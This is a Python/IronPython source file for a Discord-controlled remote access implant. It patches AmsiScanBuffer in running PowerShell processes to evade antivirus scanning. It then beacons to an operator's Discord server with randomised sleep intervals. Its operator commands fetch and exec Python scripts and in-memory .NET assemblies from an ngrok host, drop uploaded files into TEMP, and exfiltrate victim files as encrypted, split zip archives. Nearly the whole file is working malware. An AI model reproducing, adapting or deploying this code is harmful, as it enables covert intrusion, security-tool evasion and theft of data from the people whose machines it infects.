from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from discord.ext import commands
from datetime import datetime, timezone
from ctypes import *
import os,discord,asyncio,base64,random,pyzipper,clr,string,System,requests,psutil,sys,shutil,pprint

### IronPython ###
clr.AddReference("System")
clr.AddReference("System.Management")
clr.AddReference("System.Net")
clr.AddReference('System.IO')
clr.AddReference('System.Reflection')
clr.AddReference('mscorlib')

import System
import System.Net
import System.Diagnostics
from System import Environment, IO, Security, Array, String, Console
from System.Net.NetworkInformation import NetworkInterface
from System.Management import ManagementObjectSearcher
from System.Net import WebClient
from System.Reflection import Assembly
from System.IO import StringWriter
##################

### PATCHING ###
# Patch AMSI to stop dotnet and unmanaged powershell buffers from being scanned
KERNEL32 = windll.kernel32
PROCESS_ACCESS = (
    0x000F0000 |
    0x00100000 |
    0xFFFF
)
PAGE_READWRITE = 0x40


def getPowershellPids():
    ppids = [pid for pid in psutil.pids() if psutil.Process(pid).name() == 'powershell.exe']
    return ppids


def readBuffer(handle, baseAddress, AmsiScanBuffer):
    KERNEL32.ReadProcessMemory.argtypes = [c_ulong, c_void_p, c_void_p, c_ulong, c_int]
    while True:
        lpBuffer = create_string_buffer(b'', len(AmsiScanBuffer))
        nBytes = c_int(0)
        KERNEL32.ReadProcessMemory(handle, baseAddress, lpBuffer, len(lpBuffer), nBytes)
        if lpBuffer.value == AmsiScanBuffer or lpBuffer.value.startswith(b'\x29\xc0\xc3'):
            return baseAddress
        else:
            baseAddress += 1


def writeBuffer(handle, address, buffer):
    nBytes = c_int(0)
    KERNEL32.WriteProcessMemory.argtypes = [c_ulong, c_void_p, c_void_p, c_ulong, c_void_p]
    res = KERNEL32.WriteProcessMemory(handle, address, buffer, len(buffer), byref(nBytes))
    if not res:
        print(f'[-] WriteProcessMemory Error: {KERNEL32.GetLastError()}')
    return res


def getAmsiScanBufferAddress(handle, baseAddress):
    AmsiScanBuffer = (
        b'\x4c\x8b\xdc' +       # mov r11,rsp
        b'\x49\x89\x5b\x08' +   # mov qword ptr [r11+8],rbx
        b'\x49\x89\x6b\x10' +   # mov qword ptr [r11+10h],rbp
        b'\x49\x89\x73\x18' +   # mov qword ptr [r11+18h],rsi
        b'\x57' +               # push rdi
        b'\x41\x56' +           # push r14
        b'\x41\x57' +           # push r15
        b'\x48\x83\xec\x70'     # sub rsp,70h
    )
    return readBuffer(handle, baseAddress, AmsiScanBuffer)


def patchAmsiScanBuffer(handle, funcAddress):
    patchPayload = (
        b'\x29\xc0' +           # xor eax,eax
        b'\xc3'                 # ret
    )
    return writeBuffer(handle, funcAddress, patchPayload)


def getAmsiDllBaseAddress(handle, pid):
    MAX_PATH = 260
    MAX_MODULE_NAME32 = 255
    TH32CS_SNAPMODULE = 0x00000008
    class MODULEENTRY32(Structure):
        _fields_ = [ ('dwSize', c_ulong) ,
                    ('th32ModuleID', c_ulong),
                    ('th32ProcessID', c_ulong),
                    ('GlblcntUsage', c_ulong),
                    ('ProccntUsage', c_ulong) ,
                    ('modBaseAddr', c_size_t) ,
                    ('modBaseSize', c_ulong) ,
                    ('hModule', c_void_p) ,
                    ('szModule', c_char * (MAX_MODULE_NAME32+1)),
                    ('szExePath', c_char * MAX_PATH)]

    me32 = MODULEENTRY32()
    me32.dwSize = sizeof(MODULEENTRY32)
    snapshotHandle = KERNEL32.CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid)
    ret = KERNEL32.Module32First(snapshotHandle, pointer(me32))
    while ret:
        if me32.szModule == b'amsi.dll':
            print(f'[+] Found base address of {me32.szModule.decode()}: {hex(me32.modBaseAddr)}')
            KERNEL32.CloseHandle(snapshotHandle)
            return getAmsiScanBufferAddress(handle, me32.modBaseAddr)
        else:
            ret = KERNEL32.Module32Next(snapshotHandle , pointer(me32))


for pid in getPowershellPids():
    process_handle = KERNEL32.OpenProcess(PROCESS_ACCESS, False, pid)
    if not process_handle:
        continue
    print(f'[+] Got process handle of powershell at {pid}: {hex(process_handle)}')
    print(f'[+] Trying to find AmsiScanBuffer in {pid} process memory...')
    amsiDllBaseAddress = getAmsiDllBaseAddress(process_handle, pid)
    if not amsiDllBaseAddress:
        print(f'[-] Error finding amsiDllBaseAddress in {pid}.')
        print(f'[-] Error: {KERNEL32.GetLastError()}')
        sys.exit(1)
    else:
        print(f'[+] Trying to patch AmsiScanBuffer found at {hex(amsiDllBaseAddress)}')
        if not patchAmsiScanBuffer(process_handle, amsiDllBaseAddress):
            print(f'[-] Error patching AmsiScanBuffer in {pid}.')
            print(f'[-] Error: {KERNEL32.GetLastError()}')
            sys.exit(1)
        else:
            print(f'[+] Success patching AmsiScanBuffer in PID {pid}')
    KERNEL32.CloseHandle(process_handle)
    print('')
################
    
DISCORD_TOKEN = "" # Discord bot token
USER_ID =  # Operator UID
CHANNEL_ID =  # Logs CID
SERVER_ID =  # Server ID

intents = discord.Intents.all()
intents.members = True
intents.reactions = True
intents.guilds = True
intents.messages = True 
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

new_channel = None
out_message = None

def generate_random_string(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

random_string = generate_random_string(10)

sample_string = random_string
sample_string_bytes = sample_string.encode("ascii") 
  
base64_bytes = base64.b64encode(sample_string_bytes) 
base64_string = base64_bytes.decode("ascii") 

### CUSTOM CMD ###
def download_file(url):
    try:
        web_client = System.Net.WebClient()
        data = web_client.DownloadData(url)
        return data
    except Exception as e:
        raise Exception(f"Failed to download file from {url}: {e}")

def execute_assembly(data,args):
    try:
        assembly = System.Reflection.Assembly.Load(data)
        entry_point = assembly.EntryPoint
        if entry_point is not None:
            parameters = args
            parameters_array = System.Array[System.String](parameters)
            entry_point.Invoke(None, [parameters_array])
            return
        else:
            return "Assembly does not have an entry point."
    except Exception as e:
        raise Exception(f"Failed to execute assembly: {e}")

def mem_exec(file,args):
    try:
        url = f"https://constantly-happy-heron.ngrok-free.app/{file}"
        data = download_file(url)
        execute_assembly(data,args)
    except Exception as e:
        print(f"An error occurred: {e}")

### CUSTOM IMPORTS & EXECUTION ###
def cmd_get(cmd,args):
    url = f"https://constantly-happy-heron.ngrok-free.app/commands/{cmd}.py"
    response = requests.get(url)
    namespace = {}
    if response.status_code == 200:
        code_to_execute = response.text
        try:
            exec(code_to_execute, namespace)
            for name, val in namespace.items():
                if callable(val) or isinstance(val, (int, float, str, list, dict, tuple)):
                    globals()[name] = val
                    
            exec(code_to_execute, globals(), {'args': args})
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print("Failed to fetch code from the URL.")
##################################
        
def current_process():
    global process_name,process_id
    current_process = System.Diagnostics.Process.GetCurrentProcess()
    process_name = current_process.ProcessName
    process_id = current_process.Id

def get_current_user():
    domain = Environment.UserDomainName
    username = Environment.UserName
    return f"{domain}\\{username}"

def is_admin():
    current_principal = Security.Principal.WindowsPrincipal(Security.Principal.WindowsIdentity.GetCurrent())
    return current_principal.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator)
##################

### TIMERS ###
min_csec = 1
max_csec = 1
min_bsec = 30
max_bsec = 60

@bot.command(name='csec')
async def set_seconds(ctx, min_sec: int = None, max_sec: int = None):
    global min_csec, max_csec
    if min_sec is None or max_sec is None:
        await initial_message.delete()
        await ctx.send('```Please provide both minimum and maximum seconds```')
    elif min_sec < max_sec:
        min_csec = min_sec
        max_csec = max_sec
        await initial_message.delete()
        await ctx.send(f'```Command delay range has been set to {min_csec}s ~ {max_csec}s```')
    else:
        await initial_message.delete()
        await ctx.send('```Make sure the minimum value is less than the maximum value```')

@bot.command(name='bsec')
async def set_seconds(ctx, min_sec: int = None, max_sec: int = None):
    global min_bsec, max_bsec
    if min_sec is None or max_sec is None:
        await initial_message.delete()
        await ctx.send('```Please provide both minimum and maximum seconds```')
    elif min_sec < max_sec:
        min_bsec = min_sec
        max_bsec = max_sec
        await initial_message.delete()
        await ctx.send(f'```Beacon delay range has been set to {min_bsec}s ~ {max_bsec}s```')
    else:
        await initial_message.delete()
        await ctx.send('```Make sure the minimum value is less than the maximum value```')

@bot.command(name='check-times')
async def check_seconds(ctx):
        await initial_message.delete()
        await ctx.send(f'```Beacon delay range: {min_bsec}s ~ {max_bsec}s\nCommand delay range: {min_csec}s ~ {max_csec}s```')
##############
        
### HELP MENU ###
@bot.command(name='help', help='Displays all commands available.')
async def custom_help(ctx):
    help_message = """```

!run <cmd> [args] - Executes remote ipy script from server. Ex: !run ls C:\\
!mem-exec <.NET> [args] - Executes remote .NET file from server. Ex: !mem-exec SharpView.exe Get-IPAddress *
!csec <min/s> <max/s> - Sets the min and max delay for command sleep in seconds.
!bsec <min/s> <max/s> - Sets the min and max delay for beacon sleep in seconds.
!check-times - Check sleeper times.
!cleanup - Cleans the channel.
!upload - Uploads the attached file in the message to the TEMP folder.
!exfil <file1>,<file2>,... - Exfiltrates provided files. Ex: !exfil test.exe,file.xlsx,...
!exit - Terminates the beacon
```"""
    await initial_message.delete()
    await ctx.send(help_message)

#################
        
@bot.event
async def on_message(message):
    global initial_message,out_message,min_csec,max_csec

    seconds = random.randint(min_csec, max_csec)

    if message.author.id == USER_ID and message.content.startswith('!') and message.channel == new_channel:
        initial_message = await message.channel.send(f"> Command: [`{message.content}`]\n> Executing: (**{seconds}s**) ")
        await message.add_reaction("🔁")

        await asyncio.sleep(seconds)

        if message.content.startswith('!cleanup'):
            try:
                await cleanup(message)
            except Exception as e:
                await message.channel.send(f"> `cmd_!cleanup` - An error occurred: {e}")

        elif message.content.startswith('!exit'):
            await exit_command(message)

        ### CUSTOM CMD ###
        elif message.content.startswith('!run'):
            dir = message.content[len('!run')+1:].strip()
            dir_arg = dir.split()
            if len(dir_arg) < 1:
                await message.channel.send("```Usage: !run <cmd> [args]```")
            else:
                try:
                    cmd = dir_arg[0]
                    arguments = dir_arg[1:]

                    cmd_get(cmd,arguments)

                    await initial_message.delete()

                    file_name = ''.join(random.sample(base64_string[:10], k=10))
                    full_file_path = os.path.join(os.environ['TEMP'], f"{file_name}.txt")
                    with open(f"{full_file_path}", "w", encoding="utf-8") as file:
                        file.write(output)
                    out_message = await message.channel.send(file=discord.File(f"{full_file_path}"))
                except Exception as e:
                    await message.channel.send(f"```Error occurred: {e}\nReason: Failed to fetch code from the URL.```")
                finally:
                    os.remove(f"{full_file_path}")

                pass

        elif message.content.startswith('!mem-exec'):
            mem_args = message.content[len('!mem-exec')+1:].strip()
            mem_args_list = mem_args.split()

            if len(mem_args_list) < 1:
                await message.channel.send("```Usage: !mem-exec <script_url> [args]```")
            else:
                try:
                    file = mem_args_list[0]
                    arguments = mem_args_list[1:]

                    sw = StringWriter()
                    oldConsOut = Console.Out
                    Console.SetOut(sw)
                    Console.WriteLine

                    mem_exec(file, arguments)

                    Console.SetOut(oldConsOut)
                    captured_output = sw.ToString()

                    await initial_message.delete()

                    file_name = ''.join(random.sample(base64_string[:10], k=10))
                    full_file_path = os.path.join(os.environ['TEMP'], f"{file_name}.txt")
                    with open(f"{full_file_path}", "w", encoding="utf-8") as file:
                        file.write(captured_output)
                    out_message = await message.channel.send(file=discord.File(f"{full_file_path}"))
                    os.remove(f"{full_file_path}")
                except Exception as e:
                    await message.channel.send(f"```Error occurred: {e}\n```")
                finally:
                    os.remove(f"{full_file_path}")

                pass

        elif message.content.startswith('!upload'):
            if message.attachments:
                for attachment in message.attachments:
                    file_path = os.path.join(os.environ['TEMP'], attachment.filename)
                    await attachment.save(file_path)
                    
                    await initial_message.delete()
                    await message.channel.send(f"```File successfully uploaded: {file_path}```")

        #################
        elif message.content.startswith('!download'):
            try:
                ex_filename = message.content[len('!download')+1:].split(',')
                await exfil(message, ex_filename)
            except Exception as e:
                await message.channel.send(f"`> cmd_!download` - An error occurred: {e}")
        else:
            file_name = None

    await bot.process_commands(message)

@bot.event
async def on_reaction_add(reaction, user):
    if user == bot.user:
        return

    if str(reaction.emoji) == "🔁" and reaction.message.author.id == USER_ID and reaction.message.content.startswith('!') and reaction.message.channel == new_channel:
        await out_message.delete()
        await on_message(reaction.message)
        await reaction.remove(user)

async def cleanup(message):
    try:
        await message.channel.purge()
    except Exception as e:
        print(f"> `!cleanup` - An error occurred: {e}")

async def exit_command(message):
    try:
        if channel:
            await channel.send(f"[`CLOSED`] Beacon: **{device_name}** has exited via command!")
        await message.channel.delete()
        os._exit(0)
    except Exception as e:
        await message.channel.send(f"`> !exit` - An error occurred: {e}")

async def exfil(message, ex_filename):
    global zip_msg
    try:
        if 'all' in ','.join(ex_filename).lower():
            files_and_folders = [f for f in os.listdir('.') if os.path.isfile(f) or os.path.isdir(f)]
            ex_filename = files_and_folders
        else:
            ex_filename = ','.join(ex_filename).split(',')

        if not ex_filename or any(not os.path.exists(file.strip()) or not file.strip() for file in ex_filename):
            await initial_message.delete()
            await message.channel.send("> No files provided or cannot be found!")
            return
        
        password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&*()_-+={[}]|\\:;"<,>.?/', k=20))
        zip_filename = f"image_{random.randint(1000, 9999)}.zip"

        password_bytes = password.encode('utf-8')

        with pyzipper.AESZipFile(zip_filename, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
            zipf.setpassword(password_bytes)

            for file in ex_filename:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))

        await initial_message.delete()
        zip_msg = await message.channel.send(f"> `{len(ex_filename)}` file/s have been zipped with password ||`{password}`||")

        if os.path.getsize(zip_filename) > 20 * 1024 * 1024:
            await encrypt_and_split_and_upload(message, zip_filename, password)
        else:
            await message.channel.send(f"> Exfiltrating `{zip_filename}`...")
            await message.channel.send(file=discord.File(zip_filename))

        os.remove(zip_filename)
    except Exception as e:
        await message.channel.send(f"`> !exfil` - An error occurred: {e}")

async def encrypt_and_split_and_upload(message, input_file, password):
    try:
        chunk_size = 20 * 1024 * 1024  # 20 MB
        folder_name = 'spl_enc'
        os.makedirs(folder_name, exist_ok=True)

        output_enc_file = os.path.join(folder_name, f'{os.path.basename(input_file)}.enc')

        encrypt_file(password, input_file, output_enc_file)

        await zip_msg.delete()
        await message.channel.send(f"> File `{input_file}` is larger than 20 MB. Splitting and encrypting with password: ||`{password}`|| ...")

        with open(output_enc_file, 'rb') as f_enc:
            for i, chunk in enumerate(split_file(output_enc_file, chunk_size)):
                chunk_filename = os.path.join(folder_name, f'{os.path.basename(output_enc_file)}.{i}')
                with open(chunk_filename, 'wb') as f_chunk:
                    f_chunk.write(chunk)

                await message.channel.send(f"> Exfiltrating file `{i + 1}`...")
                await message.channel.send(file=discord.File(chunk_filename))

        await message.channel.send(f"> Exfiltration complete!")

    except Exception as e:
        await message.channel.send(f"> Encryption or splitting failed: {e}")
    finally:
        os.remove(output_enc_file)
        for i in range(len(os.listdir(folder_name))):
            os.remove(os.path.join(folder_name, f'{os.path.basename(output_enc_file)}.{i}'))
        os.rmdir(folder_name)

def derive_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        salt=salt,
        iterations=100000,
        length=32,
        backend=default_backend()
    )
    key = kdf.derive(password.encode('utf-8'))
    return key

def encrypt_file(password, input_file, output_file):
    salt = os.urandom(16)
    iv = os.urandom(16)
    key = derive_key(password, salt)
    cipher = Cipher(algorithms.AES(key), modes.CFB8(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        f_out.write(salt + iv)
        for chunk in iter(lambda: f_in.read(1024), b''):
            f_out.write(encryptor.update(chunk))

def split_file(input_file, chunk_size):
    with open(input_file, 'rb') as f_in:
        data = f_in.read(chunk_size)
        while data:
            yield data
            data = f_in.read(chunk_size)

rnd = 0 
ping = None
previous_ping_time = None

async def send_ping():
    global rnd, ping, previous_ping_time,min_bsec,max_bsec
    
    rnd = random.randint(min_bsec, max_bsec)

    channel = bot.get_channel(new_channel.id)
    if channel:
        global ping,previous_ping_time

        current_time = datetime.now(timezone.utc)

        if ping:
            await ping.edit(content=f"Beaconing Successful! Next check-in: `{rnd}s`\nPrevious check was `{previous_ping_time}`")
        else:
            ping = await channel.send(f"Beaconing Successful! Next check-in: `{rnd}s`")
            await ping.pin()
        previous_ping_time = current_time.strftime("%Y-%m-%d %H:%M:%S UTC")
    else:
        print("Channel not found.")

async def ping_loop():
    global rnd
    while True:
        try:
            await send_ping()
        except Exception as e:
            print(f"Error sending ping: {e}")

        await asyncio.sleep(rnd)

### TEST ###

### TEST ###

@bot.event
async def on_ready():
    current_process()
    global new_channel,channel,device_name,channel_name

    guild_id = SERVER_ID
    guild = bot.get_guild(guild_id)
    
    if guild:
        device_name = get_current_user()
        device_name = device_name.replace('\\', '_')
        channel_name = f"{device_name}"
        if is_admin():
            check_adm = ("True")
        else:
            check_adm = ("False")

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)

    channel_id = CHANNEL_ID
    channel = bot.get_channel(channel_id)
    
    if channel:
        await channel.send(f"[`OPEN`] Beacon: **{channel_name}** / IsAdmin: **{check_adm}** / PName: **{process_name} [PID:{process_id}]**")
        try:
            await channel.send(f"[`VALIDATING`] Beacon: **{channel_name}** is on Channel: **{new_channel.id}**")
        except Exception as e:
            await channel.send(f"[`VALIDATING`] Beacon: **{channel_name}**... Validation **FAILED**!")

    await send_ping()
    await ping_loop()

if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)
